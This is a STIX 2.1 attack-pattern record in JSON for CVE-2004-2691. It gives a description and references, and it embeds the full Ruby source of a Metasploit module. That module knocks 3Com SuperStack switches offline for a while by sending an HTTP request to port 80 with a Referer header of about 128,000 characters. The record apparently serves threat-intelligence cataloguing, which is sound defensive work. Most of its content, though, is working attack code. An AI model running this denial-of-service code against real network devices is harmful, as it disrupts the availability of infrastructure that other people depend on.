{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f7f3c4bd-b5b6-4ddb-b406-83fe08dff75a",
    "created": "2024-08-14T16:26:00.72447Z",
    "modified": "2024-08-14T16:26:00.724474Z",
    "name": "3Com SuperStack Switch Denial of Service",
    "description": " This module causes a temporary denial of service condition against 3Com SuperStack switches. By sending excessive data to the HTTP Management interface, the switch stops responding temporarily. The device does not reset. Tested successfully against a 3300SM firmware v2.66. Reported to affect versions prior to v2.72. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/3com_superstack_switch.rb",
            "external_id": "3com_superstack_switch.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-2691"
        },
        {
            "source_name": "reference",
            "url": "http://support.3com.com/infodeli/tools/switches/dna1695-0aaa17.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => '3Com SuperStack Switch Denial of Service',\n      'Description'    => %q{\n        This module causes a temporary denial of service condition\n        against 3Com SuperStack switches. By sending excessive data\n        to the HTTP Management interface, the switch stops responding\n        temporarily. The device does not reset. Tested successfully\n        against a 3300SM firmware v2.66. Reported to affect versions\n        prior to v2.72.\n      },\n      'Author'         => [ 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          # aushack - I am not sure if these are correct, but the closest match!\n          [ 'OSVDB', '7246' ],\n          [ 'CVE', '2004-2691' ],\n          [ 'URL', 'http://support.3com.com/infodeli/tools/switches/dna1695-0aaa17.pdf' ],\n        ],\n      'DisclosureDate' => '2004-06-24'))\n\n    register_options( [ Opt::RPORT(80) ])\n  end\n\n  def run\n    begin\n      connect\n      print_status(\"Sending DoS packet to #{rhost}:#{rport}\")\n\n      sploit = \"GET / HTTP/1.0\\r\\n\"\n      sploit << \"Referer: \" + Rex::Text.rand_text_alpha(1) * 128000\n\n      sock.put(sploit +\"\\r\\n\\r\\n\")\n      disconnect\n      print_error(\"DoS packet unsuccessful\")\n    rescue ::Rex::ConnectionRefused\n      print_error(\"Unable to connect to #{rhost}:#{rport}\")\n    rescue ::Errno::ECONNRESET\n      print_good(\"DoS packet successful. #{rhost} not responding.\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-06-24"
}